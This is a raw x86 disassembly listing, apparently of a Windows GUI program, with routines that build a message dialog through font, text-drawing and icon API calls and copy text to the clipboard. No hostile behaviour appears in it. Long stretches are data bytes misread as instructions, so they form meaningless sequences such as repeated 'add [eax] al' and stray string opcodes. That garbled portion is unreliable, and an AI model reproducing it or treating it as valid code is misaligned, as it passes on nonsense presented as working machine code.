bound eax [ esi ]
cwde
inc ebp
add al bl
mov edx 0xbadc0044
inc esp
add ah ch
arpl [ esi ] ax
jl r-xdata
inc esp
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax - 0x20 ] 0xac004665
inc esi
add [ eax ] cl
leave
inc esp
add [ eax + 0x66 ] bl
inc esi
add [ eax ] al
in al dx
inc esp
add ah ch
inc ebp
add [ eax - 0x5bffbad1 ] ch
sub al [ ebp ]
mov [ edi ] gs
inc ebp
add al dh
push ebp
inc esi
add ah bh
insb
inc esi
add [ eax + 0x5 ] bl
inc ebp
add al al
jns r-xdata
pop eax
inc esi
add [ ecx + ebx * 4 + 0x46 ] al
add [ eax ] ah
jge r-xdata
inc [ ebp - 0x72ec8b40 ]
inc ebp
les edx [ eax - 0x18 ]
test eax 0x8bfffd52
ror [ ebx - 0x81797ba ] 0x1
popad
inc esi
outsd
jb r-xdata
add [ eax + eax * 4 ] ah
inc esi
add al bh
cdq
add ah bl
jpo r-xdata
test eax eax
je r-xdata
lea eax [ eax ]
in al dx
adc [ ebx ] eax
pop es
or al 0x54
dec ebp
jae r-xdata
0x65dc0046 0x46
or al 0x54
dec ebp
jae r-xdata
add [ esi ] 0xf8
inc esi
add al dh
add eax 0x5f40045
inc ebp
add [ eax + 0x7e ] bl
inc esi
add [ esp + eax + 0x45 ] dl
add ah cl
xor [ ebp ] al
dec esp
test [ esi ] eax
rol [ edx + 0x45 ] 0x0
dec eax
sub eax 0x9a600045
inc esi
add ah ah
dec edi
inc esi
add [ edx + edx * 2 - 0x74bfffba ] dl
inc esi
add [ ebx + ebx * 2 + 0x46 ] bh
add al bh
pop ebx
inc esi
add [ eax - 0x62 ] al
inc esi
add [ eax + ebx * 2 - 0x66bbffba ] dh
mov eax esi
test bl bl
je r-xdata
lea eax [ ebp - 0x3c ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ esi + 0x68 ]
call sub_424660
xor edi edi
dec [ ebx + 0x74db84c6 ]
psubsb mm6 mmx0
and edi ebp
jmp [ edi + ecx * 4 + 0x5 ]
popad
inc esi
outsd
jb r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
in al 0x10
inc ebx
add ah ch
sub eax [ esi ]
pop esi
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x73676f
add [ ebx - 0x1374aa40 ] cl
add esp 0xfffffeac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push 0x0
xor edx edx
mov eax esi
call sub_4658b4
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
add esp 0xfffffff0
call sub_40360c
sub_431210
push ebp
mov ebp esp
add esp 0xfffffeac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push 0x0
xor edx edx
mov eax esi
call sub_4658b4
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
test bl bl
je r-xdata
lea eax [ ebp - 0x3c ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ esi + 0x68 ]
call sub_424660
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4312a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_4312f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ r-xdata ]
cmp al [ ebp + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4312ff
lea eax [ ebp - 0x4 ]
call sub_404038
retn
cmp [ esi ] 0x43
jne r-xdata
call sub_40c30c
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_431448
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43130c
sub_43130c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_4044e8
xor eax eax
push ebp
push sub_43143a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call OpenClipboard
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431441
lea eax [ ebp - 0x4 ]
call sub_404038
retn
xor eax eax
push ebp
push sub_431406
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4042f8
inc eax
push eax
push 0x2002
call GlobalAlloc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4313db
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov ebx eax
xor eax eax
push ebp
push sub_4313ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4042f8
inc eax
push eax
mov eax [ ebp - 0x4 ]
call sub_4044f8
mov edx ebx
pop ecx
call sub_4028c8
call EmptyClipboard
mov eax [ ebp - 0x8 ]
push eax
push 0x1
call SetClipboardData
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4313d1
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
retn
sub_4313d1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
call CloseClipboard
retn
sub_4313e0
mov eax [ ebp - 0x8 ]
push eax
call GlobalFree
call sub_403a9c
call sub_403af0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
call CloseClipboard
retn
sub_431448
push ebp
mov ebp esp
add esp 0xffffff8c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4315f9
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx 0x1b
mov al 0x2d
call sub_4046e8
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
mov ecx r-xdata
call sub_404344
mov eax ebx
call sub_42156c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x1c ]
push eax
xor ecx ecx
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_40ce58
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0xc ]
call sub_4040d0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x68 ] 0xb
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_44c874
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x60 ] 0xb
mov eax r-xdata
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x58 ] 0xb
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x50 ] 0xb
lea edx [ ebp - 0x74 ]
mov eax [ ebx + 0x2f8 ]
call sub_44c874
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0xb
mov eax r-xdata
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x40 ] 0xb
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] 0xb
mov eax [ ebp - 0xc ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] 0xb
mov eax r-xdata
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0xb
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] 0xb
lea edx [ ebp - 0x6c ]
mov ecx 0x9
mov eax r-xdata
call sub_40911c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431600
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x14 ]
call sub_404038
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_40405c
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
push [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_421540
lea edx [ ebp - 0x14 ]
call sub_44c874
push [ ebp - 0x14 ]
lea ecx [ ebp - 0x18 ]
mov edx 0x3
mov al 0x20
call sub_4046e8
push [ ebp - 0x18 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4043b8
mov edx esi
mov eax ebx
call sub_421540
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
sub_4316e8
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x68 ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x7 ] cx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_431c58
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_431210
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov dl 0x3
mov eax [ ebp - 0xc ]
call sub_466eb4
mov eax [ ebp - 0xc ]
call sub_46716c
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x68 ]
call sub_42546c
mov eax [ ebp - 0xc ]
mov [ eax + 0x22d ] 0x1
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1dc ] edx
mov [ eax + 0x1d8 ] sub_4312a0
mov eax [ ebp - 0xc ]
call sub_46716c
lea edx [ ebp - 0x14 ]
call sub_431044
push 0x4
mov ebx [ ebp - 0x14 ]
push ebx
push 0x8
call MulDiv
mov [ ebp - 0x18 ] eax
push 0x8
mov esi [ ebp - 0x10 ]
push esi
push 0x8
call MulDiv
mov [ ebp - 0x1c ] eax
push 0x4
push ebx
push 0xa
call MulDiv
mov [ ebp - 0x20 ] eax
push 0x8
push esi
push 0xa
call MulDiv
mov [ ebp - 0x24 ] eax
push 0x4
push ebx
push 0x32
call MulDiv
mov [ ebp - 0x28 ] eax
xor ebx ebx
mov esi rw-data
mov [ ebp - 0x4c ] rw-data
jae r-xdata
and eax 0x7f
bt [ ebp - 0x7 ] eax
inc ebx
add [ ebp - 0x4c ] 0x4
add esi 0x4
cmp bl 0xb
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax ebx
cmp al 0xf
ja r-xdata
push 0x8
mov eax [ ebp - 0x10 ]
push eax
push 0xe
call MulDiv
mov [ ebp - 0x2c ] eax
push 0x4
mov eax [ ebp - 0x14 ]
push eax
push 0x4
call MulDiv
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46aaa8
sar eax 0x1
jns r-xdata
mov eax [ esi ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
push 0x0
lea eax [ ebp - 0x60 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_417298
mov eax [ ebp - 0xc ]
call sub_44ebe4
or eax 0x420
push eax
lea eax [ ebp - 0x60 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x64 ]
mov eax [ ebp - 0x4c ]
mov eax [ eax ]
call sub_405df8
mov eax [ ebp - 0x64 ]
call sub_4044f8
push eax
mov eax [ ebp - 0xc ]
call sub_46716c
call sub_425570
push eax
call DrawTextA
mov eax [ ebp - 0x58 ]
sub eax [ ebp - 0x60 ]
add eax 0x8
mov [ esi ] eax
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x60 ]
push eax
call SetRect
mov eax [ ebp - 0xc ]
call sub_44ebe4
or eax 0x450
push eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4042f8
inc eax
push eax
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
mov eax [ ebp - 0xc ]
call sub_46716c
call sub_425570
push eax
call DrawTextA
xor eax eax
mov al [ ebp - 0x5 ]
mov edi [ eax * 4 + rw-data ]
mov esi [ ebp - 0x58 ]
mov eax [ ebp - 0x54 ]
mov [ ebp - 0x34 ] eax
test edi edi
je r-xdata
adc eax 0x0
mov [ ebp - 0x28 ] eax
xor eax eax
xor ebx ebx
mov eax [ ebp - 0x20 ]
add eax 0x20
add esi eax
cmp [ ebp - 0x34 ] 0x20
jge r-xdata
jae r-xdata
and edx 0x7f
bt [ ebp - 0x7 ] edx
mov [ ebp - 0x34 ] 0x20
inc ebx
cmp bl 0xb
jne r-xdata
inc eax
mov edx ebx
cmp dl 0xf
ja r-xdata
xor ebx ebx
test eax eax
je r-xdata
mov edx ebx
mov eax esi
call sub_42be9c
mov edx eax
mov eax [ ebp - 0x18 ]
add eax eax
add edx eax
mov eax [ ebp - 0xc ]
call sub_4664d4
mov edx [ ebp - 0x34 ]
add edx [ ebp - 0x2c ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x1c ]
add eax eax
add edx eax
mov eax [ ebp - 0xc ]
call sub_466504
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46aaa8
mov edx eax
sar edx 0x1
jns r-xdata
mov ebx [ ebp - 0x28 ]
imul ebx eax
dec eax
imul [ ebp - 0x30 ]
add ebx eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x48 ]
sar eax 0x1
jns r-xdata
adc edx 0x0
sub edx eax
mov eax [ ebp - 0xc ]
call sub_44bfbc
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46aa9c
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4c ]
sar eax 0x1
jns r-xdata
adc edx 0x0
sub edx eax
mov eax [ ebp - 0xc ]
call sub_44bfe0
cmp [ ebp - 0x5 ] 0x4
je r-xdata
adc eax 0x0
lea edx [ ebp - 0x6c ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46cb98
mov edx [ ebp - 0x6c ]
mov eax [ ebp - 0xc ]
call sub_44c8a4
lea edx [ ebp - 0x68 ]
xor eax eax
mov al [ ebp - 0x5 ]
mov eax [ eax * 4 + rw-data ]
call sub_405df8
mov edx [ ebp - 0x68 ]
mov eax [ ebp - 0xc ]
call sub_44c8a4
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_442118
mov edi eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x2f8 ] edi
mov edx r-xdata
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax edi
call sub_4425f0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44c8a4
lea edx [ ebp - 0x60 ]
mov eax edi
call sub_44c234
mov eax [ ebp - 0xc ]
mov dl [ eax + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub esi [ ebp - 0x58 ]
add esi [ ebp - 0x18 ]
mov [ ebp - 0x3c ] esi
mov eax edi
mov si 0xffc8
call sub_4034a4
test al al
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4339bc
mov [ ebp - 0x44 ] eax
mov edx r-xdata
mov eax [ ebp - 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
push edi
push 0x0
call LoadIconA
push eax
mov eax [ ebp - 0x44 ]
mov eax [ eax + 0x168 ]
call sub_427700
pop edx
call sub_42b7b0
push 0x20
push 0x20
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x44 ]
mov edi [ eax ]
call [ edi + 0x84 ]
test edi edi
je r-xdata
mov eax [ ebp - 0x58 ]
push eax
mov eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x3c ]
mov eax edi
mov esi [ eax ]
call [ esi + 0x84 ]
test [ ebp - 0x7 ] 0x4
je r-xdata
mov eax [ ebp - 0xc ]
call sub_44c278
sub eax [ ebp - 0x3c ]
sub eax [ edi + 0x48 ]
mov [ ebp - 0x3c ] eax
test [ ebp - 0x7 ] 0x1
je r-xdata
mov [ ebp - 0x3d ] 0x2
jmp r-xdata
mov [ ebp - 0x3d ] 0x5
mov [ ebp - 0x3d ] 0x0
jmp r-xdata
test [ ebp - 0x7 ] 0x8
je r-xdata
test [ ebp - 0x7 ] 0x2
je r-xdata
mov [ ebp - 0x3e ] 0x3
jmp r-xdata
mov [ ebp - 0x3e ] 0x2
mov [ ebp - 0x3e ] 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_44c278
sub eax ebx
sar eax 0x1
jns r-xdata
mov [ ebp - 0x38 ] eax
xor ebx ebx
mov [ ebp - 0x4c ] rw-data
mov esi rw-data
mov [ ebp - 0x50 ] rw-data
adc eax 0x0
jae r-xdata
and eax 0x7f
bt [ ebp - 0x7 ] eax
inc ebx
add [ ebp - 0x50 ] 0x4
add esi 0x4
add [ ebp - 0x4c ] 0x4
cmp bl 0xb
jne r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4452e0
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x4c ]
mov edx [ eax ]
mov eax [ ebp - 0x48 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x48 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
lea edx [ ebp - 0x70 ]
mov eax [ esi ]
call sub_405df8
mov edx [ ebp - 0x70 ]
mov eax [ ebp - 0x48 ]
call sub_44c8a4
mov eax [ ebp - 0x50 ]
mov eax [ eax ]
mov edx [ ebp - 0x48 ]
mov [ edx + 0x214 ] eax
cmp bl [ ebp - 0x3d ]
jne r-xdata
mov eax ebx
cmp al 0xf
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431c5f
lea eax [ ebp - 0x70 ]
mov edx 0x4
call sub_40405c
retn
cmp bl [ ebp - 0x3e ]
jne r-xdata
mov dl 0x1
mov eax [ ebp - 0x48 ]
call sub_4453c0
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov ecx [ ebp - 0x34 ]
add ecx [ ebp - 0x1c ]
add ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x48 ]
mov edi [ eax ]
call [ edi + 0x84 ]
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x30 ]
add [ ebp - 0x38 ] eax
cmp bl 0xa
jne r-xdata
mov eax [ ebp - 0x48 ]
mov [ eax + 0x211 ] 0x1
mov eax [ ebp - 0x48 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x124 ] edx
mov [ eax + 0x120 ] r-xdata
sub_431c8c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x2 ] cx
mov ecx [ ebp + 0x8 ]
push ecx
push 0xffffffff
push 0xffffffff
push 0x0
mov cx [ ebp - 0x2 ]
call sub_431cd0
pop ecx
pop ebp
retn 0x4
sub_431cac
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x2 ] cx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
push 0x0
mov cx [ ebp - 0x2 ]
call sub_431cd0
pop ecx
pop ebp
retn 0xc
sub_431cd0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x3 ] cx
mov [ ebp - 0x1 ] dl
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
mov cx [ ebp - 0x3 ]
mov dl [ ebp - 0x1 ]
call sub_4316e8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_431d6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_44c1b4
mov eax [ ebp - 0xc ]
add eax 0x23c
mov edx [ ebp + 0x8 ]
call sub_40408c
test ebx ebx
jl r-xdata
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_44bfbc
test esi esi
jge r-xdata
mov edx esi
mov eax [ ebp - 0xc ]
call sub_44bfe0
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0xec ]
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431d76
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
test ebx ebx
jge r-xdata
mov dl 0x4
mov eax [ ebp - 0xc ]
call sub_467514
sub_431da8
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_40909c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_431e43
add [ edi ] cl
add [ eax ] al
add ah ah
cmp [ ecx ] cl
sbb al 0x41
dec ecx
add [ eax ] al
add [ eax ] al
add al ah
cmp [ ecx ] cl
mov [ ebx + 0x49 ] al
add [ eax ] al
add [ eax ] al
add ah bl
cmp [ ecx ] cl
fadd [ eax + 0x49 ]
add [ eax ] al
add [ eax ] al
add al bl
cmp [ ecx ] cl
mov eax 0x4944
add [ eax ] al
add ah dl
cmp [ ecx ] cl
movsb [ edi ] [ esi ]
inc ebx
dec ecx
add [ eax ] al
add [ eax ] al
add al dl
cmp [ ecx ] cl
cmp [ ebx + 0x49 ] al
add [ eax ] al
add [ eax ] al
add ah cl
cmp [ ecx ] cl
inc eax
inc esp
dec ecx
add [ eax ] al
add [ eax ] al
add al cl
cmp [ ecx ] cl
mov [ edx + 0x49 ] al
add [ eax ] al
add [ eax ] al
add ah al
cmp [ ecx ] cl
push eax
inc ebx
dec ecx
add [ eax ] al
add [ eax ] al
add al al
cmp [ ecx ] cl
lodsb [ esi ]
inc edx
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax + edi + 0x45440049 ] bh
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax + edi + 0x49 ] dh
add [ eax + 0x41 ] ch
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax + 0x38 ] dh
dec ecx
add [ eax + 0x4944 ] ah
add [ eax ] al
add [ eax + edi + 0x49 ] ch
add al ah
inc esp
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax + 0x38 ] ch
dec ecx
add al dh
inc edx
dec ecx
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_431f4e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431f55
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_404aec
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_431f58
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403e0c
call sub_431da8
mov eax [ r-xdata ]
call sub_417f08
mov eax [ r-xdata ]
call sub_417fa8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417f54
sub_431f9c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
and [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ edx + edi + 0x43 ] dl
add [ eax - 0x4fffbb17 ] bh
fld [ eax + eax + 0x24 ]
pop [ ecx ]
sub cl 0x44
add [ edi * 4 - 0x4377ffbc ] bl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ ecx + edi - 0x27b7ffbd ] bh
inc esp
add [ eax ] ch
aas
inc ebx
add [ ecx + ebx * 8 ] dl
inc esp
add [ eax - 0x3ffbb45 ] dl
retn 0x44
inc ebx
add [ edx - 0x7fffbce0 ] al
add [ eax ] eax
add [ ebx + ecx * 4 + 0x44 ] cl
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi - 0x2327ffc0 ] al
sub_43202c
mov bl cl
inc esp
add al bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_432344
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07001d ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
js r-xdata
add [ eax ] al
dec edi
jbe r-xdata
pushfd
push eax
outsd
jo r-xdata
jae r-xdata
inc esp
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax + 0x4f0b0024 ] al
or [ bx + di + 0x44 ] bh
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090022 ] al
outsb
inc ebp
outsb
inc esp
outsd
jo r-xdata
add [ eax ] al
lodsb [ esi ]
and eax 0x43
jge r-xdata
cmp [ ecx + 0x44 ] 0x0
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0b00
dec ebp
outsd
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ edx ] cl
dec edi
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe94223af
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0020 ] al
outsb
inc esp
jb r-xdata
jpo r-xdata
outsd
ja r-xdata
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x5a
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
pop edx
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edi ] ah
inc ebx
add [ eax ] al
inc ebx
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0028 ] al
imul edx [ ebx + edi * 2 + 0x44 ] 0x0
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or ecx [ edi + 0x6e ]
dec ebp
outsd
jbe r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090023 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
add [ eax ] al
add [ eax + 0x4f090026 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x27 ] cl
inc ebx
add [ edi + 0x43 ] dh
add [ edx + eax ] ah
add [ eax ] al
insb
mov [ eax + eax - 0x34 ] es
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4327 ] cl
insb
jae r-xdata
inc eax
add [ eax + 0x32 ] al
